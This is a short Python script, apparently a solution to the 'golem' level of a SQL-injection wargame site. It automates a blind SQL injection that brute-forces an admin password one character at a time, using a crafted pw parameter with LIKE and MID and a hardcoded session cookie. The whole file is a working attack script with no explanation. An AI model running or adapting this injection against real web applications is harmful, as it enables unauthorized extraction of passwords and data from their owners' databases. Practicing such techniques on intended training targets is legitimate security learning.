import requests



def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	for i in range(1,9):
		print("progress : " + str(i))
		for guess in range(48,123):
			print("matching with : " + chr(guess))
			URL="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=-1' || id like 'admin' %26%26 mid(pw,"+str(i)+",1) like '"+chr(guess)
			response=requests.get(URL,cookies=cookies)
			if "Hello admin" in response.text:
				print("order : "+str(i)+" password : "+chr(guess))
				password+=chr(guess)
				break
	print("password is "+password)

if __name__ == "__main__":
	print("golem Injection Start") 
	blindi()
